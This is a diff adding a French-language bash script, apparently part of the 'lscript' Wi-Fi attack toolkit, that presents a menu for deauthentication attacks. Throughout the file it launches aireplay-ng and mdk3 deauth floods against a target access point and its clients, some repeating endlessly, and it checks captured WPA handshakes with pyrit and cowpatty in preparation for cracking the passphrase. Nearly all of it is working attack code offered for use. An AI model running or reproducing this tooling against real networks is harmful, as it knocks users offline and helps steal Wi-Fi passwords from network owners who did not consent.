@@ -1,0 +1,414 @@
+#! /bin/bash
+
+#############DEFAUTS###############
+DPID=$$
+echo -e "$DPID" > "$LPATH"/dpid.txt
+####################################
+printf '\033]2;MENU DEAUTH\a'
+k=1
+REDEAUTH="n"
+WLANNM=$(cat /root/lscript/wlanmon.txt)
+export WLANNM
+####################################
+printf '\033]2;MENU DEAUTH\a'
+REDEAUTH="n"
+WLANNM=$(cat /root/lscript/wlanmon.txt)
+export WLANNM
+function find_pid
+{
+j=1
+while true
+do
+	CURPID="dpid"$j".txt"
+	FINDPID=$(ls "$LPATH" | grep "$CURPID")
+	if [[ "$FINDPID" == "" ]]
+	then
+		AVPID="$CURPID"
+		break
+	fi
+	j=$((j+1))
+done
+}
+function defaults_lh2
+{
+#chemin pour lscript
+	LPATH="/root/lscript"
+	export LPATH
+#début Jaune 
+	YS="\e[1;33m"
+#début Bleu 
+	BS="\e[0;34m"
+#couleur de fin
+	CE="\e[0m"
+#début Rouge
+	RS="\e[1;31m"
+#début Noir
+	BLS="\e[0;30m"
+#début Gris Foncé
+	DGYS="\e[1;30m"
+#début Bleu Clair
+	LBS="\e[1;34m"
+#début Vert
+	GNS="\e[0;32m"
+#début Vert Clair
+	LGNS="\e[1;32m"
+#début Cyan
+	CYS="\e[0;36m"
+#début Cyan Clair
+	LCYS="\e[1;36m"
+#début Rouge Clair
+	DRS="\e[0;31m"
+#début Violet
+	PS="\e[0;35m"
+#début Violet Clair
+	LPS="\e[1;35m"
+#début Marron
+	BRS="\e[0;33m"
+#début Gris Clair
+	LGYS="\e[0;37m"
+#début Blanc
+	WHS="\e[1;37m"
+#réglage variables fréquentes
+	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Entrer"$CE"=yes)"
+	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Entrer"$CE"=no)"
+	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
+	PAKT="Appuyez sur "$YS"une touche$CE pour"
+	PAKTC="Appuyez sur "$YS"une touche$CE pour continuer..."
+	PAKTGB="Appuyez sur "$YS"une touche$CE pour revenir en arrière..."
+	TNI=""$RS"L'outil n'est pas installé. Pour l'installer, tapez '"$CE""$YS"install"$CE""$RS"'."$CE""
+#code à lire depuis le clavier sans retour
+	READAK="read -n 1"
+}
+function option3
+{
+while true
+do
+	#~ echo -e "Recherche de clients"
+	if [[ ! -f "$HANDFORDEAUTH" ]]
+	then
+		echo -e ""$RS"Erreur 2"$CE""
+		sleep 2
+		break
+	fi
+	lines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
+	dlines=$((lines-6))
+	if [[ "$dlines" -le 0 ]]
+	then
+		echo -e ""$RS"Aucun client trouvé (encore)."$CE""
+		sleep 2
+		break
+	fi
+	clear
+	echo -e "$dlines clients trouvés."
+	sleep 1
+	n=1
+	while [[ "$n" -le "$dlines" ]]
+	do
+		n1=$((5+n))
+		station[$n]=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
+		if [[ "$n" -ge 10 ]]
+		then
+			echo -e ""$YS""$n""$CE") "${station[$n]}""
+		else
+			echo -e ""$YS" "$n""$CE") "${station[$n]}""
+		fi
+		n=$((n+1))
+	done
+	echo -e ""$YS" a"$CE") Deauth tous les clients séparément"
+	echo -e ""$YS" m"$CE") Entrer manuellement un MAC à Deauth"
+	echo -e ""$YS" r"$CE") Rafraîchir"
+	echo -e ""$YS" b"$CE") Retour"
+	echo -e "Choix: "
+	read STATION
+	clear
+	if [[ "$STATION" = "m" ]]
+	then
+		echo -e "MAC à deauth: "
+		read MACTD
+		echo -e "Nombre de deauths à envoyer("$YS"0"$CE"=inf)("$YS"Entrer"$CE"=0): "
+		read DEAUTHS
+		if [[ "$DEAUTHS" = "" ]]
+		then
+			DEAUTHS=0
+		fi
+		export DEAUTHS
+		export TARGB
+		export MACTD
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown
+	fi
+	if [[ "$STATION" = "r" ]]
+	then
+		clear
+		continue
+	fi
+	if [[ "$STATION" = "a" ]]
+	then
+		echo -e "Nombre de deauths à envoyer("$YS"0"$CE"=inf)("$YS"Entrer"$CE"=0): "
+		read DEAUTHS
+		if [[ "$DEAUTHS" = "" ]]
+		then
+			DEAUTHS=0
+		fi
+		n=1
+		while [[ "$n" -le "$dlines" ]]
+		do
+			DSTATION="${station[$n]}"
+			export DEAUTHS
+			export TARGB
+			export DSTATION
+			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
+			n=$((n+1))
+		done
+	fi
+	if [[ "$STATION" = "b" ]]
+	then
+		break
+	fi
+	if [[ "$STATION" -le "$dlines" && "$STATION" -ge 1 ]]
+	then
+		echo -e "Nombre de deauths à envoyer("$YS"0"$CE"=inf)("$YS"Entrer"$CE"=0): "
+		read DEAUTHS
+		if [[ "$DEAUTHS" = "" ]]
+		then
+			DEAUTHS=0
+		fi
+		DSTATION="${station[$STATION]}"
+		export DEAUTHS
+		export TARGB
+		export DSTATION
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
+	fi
+done
+}
+function pyrit_hand_check
+{
+	clear
+	echo -e "Vérification du handshake avec pyrit..."
+	TEMP=$(pyrit -r "$HANDCAP" analyze 2>/dev/null) 
+	TEMPHAND=$(echo "$TEMP" | grep "No valid EAOPL-handshake + ESSID detected.")
+	clear
+	if [[ "$TEMPHAND" = "" ]]
+	then
+		VALIDH=1
+		#TEMPHANDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "good")
+		TEMPHANDD=$(echo "$TEMP" | grep "good")
+		if [[ "$TEMPHANDD" = "" ]]
+		then
+			TEMPHAD=$(echo "$TEMP" | grep "workable")
+			if [[ "$TEMPHAD" = "" ]]
+			then	
+				#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
+				TEMPHANDDD=$(echo "$TEMP" | grep "bad")
+				if [[ "TEMPHANDDD" = "" ]]
+				then
+					echo -e "Handshake trouvé!(Status: "$RS"inconnu"$CE")"
+				else
+					echo -e "Handshake trouvé!(Status: "$RS"mauvais"$CE")"
+				fi
+				sleep 2
+			else
+				echo -e "Handshake trouvé!(Status: "$RS"suffisant"$CE")"
+			fi			
+		else
+			echo -e "Handshake valide trouvé!(Status: "$YS"bon"$CE")"
+			sleep 2
+		fi
+	else
+		VALIDH=0
+		echo -e ""$RS"Aucun handshake trouvé."$CE""
+		sleep 2
+	fi
+}
+function cowpatty_hand_check
+{
+	clear
+	echo -e "Vérification du handshake avec cowpatty..."
+	sleep 1
+	TEMPHAND=$(cowpatty -c -r "$HANDCAP" | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase.")
+	clear
+	if [[ "$TEMPHAND" = "" ]]
+	then
+		VALIDH=0
+		echo -e ""$RS"Aucun handshake trouvé"$CE""
+		sleep 1
+	else
+		VALIDH=1
+		echo -e ""$YS"Handshake valide trouvé!"$CE""
+		sleep 2
+	fi
+}
+defaults_lh2
+if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
+then
+	read IGN < ""$LPATH"/settings/ignorenegativeone.txt"
+else
+	IGN="no"
+fi
+if [[ "$IGN" = "yes" ]]
+then
+	IGNN="--ignore-negative-one"
+else
+	IGNN=""
+fi
+
+while true
+do
+	clear
+	echo -e ""$YS" 1"$CE") Tout Deauth                     aireplay-ng"
+	echo -e ""$YS" 2"$CE") Tout Deauth                     mdk3"
+	echo -e ""$YS" 3"$CE") Deauth client/s                 aireplay-ng"
+	echo -e ""$YS" 4"$CE") Deauth tout périodiquement      aireplay-ng"
+	if [[ "$HANDF" != "deauth" ]]
+	then
+		#~ if [[ -f "$LPATH"/settings/checkauto.txt ]]
+		#~ then
+			#~ read checka < "$LPATH"/settings/checkauto.txt
+			#~ if [[ "$checka" == 1 ]]
+			#~ then
+				#~ checkauto="Automatic"
+			#~ else
+				#~ checkauto=""$RS"Manual"$CE""
+			#~ fi
+		#~ else
+			#~ checkauto=""$RS"Manual"$CE""
+		#~ fi				
+		echo -e ""$YS" 5"$CE") Vérifier la qualité du handshake" ##          "$YS"$checkauto"$CE""
+		echo -e ""$YS" 6"$CE") Autocheck du handshake"
+		#echo -e ""$YS" 7"$CE") Vider le fichier (quand il est gros & sans handshake)"
+	fi
+	#~ if [[ "$LASTOPTIONS" != "" ]]
+	#~ then
+		#~ echo -e ""$YS"ENTER"$CE") Dernière option"
+	#~ fi
+	echo -e ""$YS" 0"$CE") Quitter"
+	read DT
+	if [[ "$DT" = 1 ]]
+	then
+		PER=0
+		echo -e "Nombre de deauths à envoyer("$YS"0"$CE"=inf)("$YS"Entrer"$CE"=0): "
+		read -e DEAUTHS
+		if [[ -z "$DEAUTHS" ]]
+		then
+			DEAUTHS=0
+		fi
+		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit"
+		export DEAUTHS
+		export TARGB
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
+	elif [[ "$DT" == 4 ]]
+	then
+		echo -e "Nombre de deauths à la fois: "
+		read DPT
+		if [[ ! "$DPT" -gt 0 ]]
+		then
+			echo -e ""$RS"Nombre invalide"$CE""
+			sleep 2
+			LASTOPTIONS=""
+			continue
+		fi
+		echo -e "Délais en secondes: "
+		read DIS
+		if [[ ! "$DIS" -gt 0 ]]
+		then
+			echo -e ""$RS"Nombre invalide"$CE""
+			sleep 2
+			LASTOPTIONS=""
+			continue
+		fi
+		export DIS
+		export DPT
+		clear
+		PER=1
+		LASTOPTIONS="4"
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown
+	elif [[ "$DT" == 5 ]]
+	then
+		if [[ "$HANDF" != "deauth" ]]
+		then
+			while true
+			do
+				clear
+				echo -e ""$YS" 1"$CE") Vérifier avec pyrit"
+				echo -e ""$YS" 2"$CE") Vérifier avec cowpatty"
+				echo -e ""$YS" b"$CE") Retour"
+				echo -e "Choix: "
+				read CHW
+				if [[ "$CHW" = 1 ]]
+				then
+					pyrit_hand_check
+				elif [[ "$CHW" = 2 ]]
+				then
+					cowpatty_hand_check
+				elif [[ "$CHW" = "b" ]]
+				then
+					clear
+					break
+				fi
+			done
+		fi
+#	elif [[ "$DT" == 7 ]]
+#	then
+#		if [[ "$HANDF" != "deauth" ]]
+#		then
+#			echo "" > /root/handshakes/"$HANDF"-01* && echo -e "Fait"
+#		fi
+	elif [[ "$DT" == 6 ]]
+	then
+		if [[ "$HANDF" != "deauth" ]]
+		then
+			echo -e "Interval en secondes("$YS"Enter"$CE"="$YS"5"$CE"): "
+			read Del
+			if [[ "$Del" == "" ]]
+			then
+				Del=5
+			fi
+			if [[ "$Del" -gt 0 ]]
+			then
+				export Del
+				export HANDCAP
+				xterm -geometry 50x20+0+999999 -T "AUTOCHECK FOR HANDSHAKE" -e "lh21" & disown
+			else
+				echo -e ""$RS"Interval invalide"$CE""
+				sleep 2
+			fi
+		fi
+	#~ elif [[ "$DT" == "" ]]
+	#~ then
+		#~ if [[ "$HANDFORDEAUTH" != "" ]]
+		#~ then
+			#~ if [[ "$LASTOPTIONS" != "" ]]
+			#~ then
+				#~ if [[ "$LASTOPTIONS" = 1 ]]
+				#~ then
+					#~ option3
+				#~ elif [[ "$LASTOPTIONS" = 4 ]]
+				#~ then
+					#~ xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
+				#~ else
+					#~ xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
+				#~ fi
+			#~ fi
+		#~ fi
+		#~ sleep 2
+	elif [[ "$DT" = 2 ]]
+	then
+		echo "$TARGB" > /root/mdk3bssid.txt
+		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
+		export DEAUTHS
+		export TARGB
+		find_pid
+		export AVPID
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING WITH MDK3" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
+	elif [[ "$DT" = 3 ]]
+	then
+		LASTOPTIONS=1
+		option3
+	elif [[ "$DT" = 0 ]]
+	then
+		exit
+	fi
+done
